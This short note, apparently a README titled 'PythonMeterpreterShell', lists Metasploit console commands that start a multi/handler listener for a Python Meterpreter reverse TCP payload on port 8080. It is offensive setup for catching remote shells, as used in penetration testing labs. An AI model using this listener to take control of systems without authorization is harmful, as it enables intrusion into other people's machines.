# PythonMeterpreterShell

$ sudo msfconsole
* msf6 > use exploit/multi/handler
* set payload python/meterpreter/reverse_tcp
* set lhost eth0
* set lport 8080
* exploit -j 
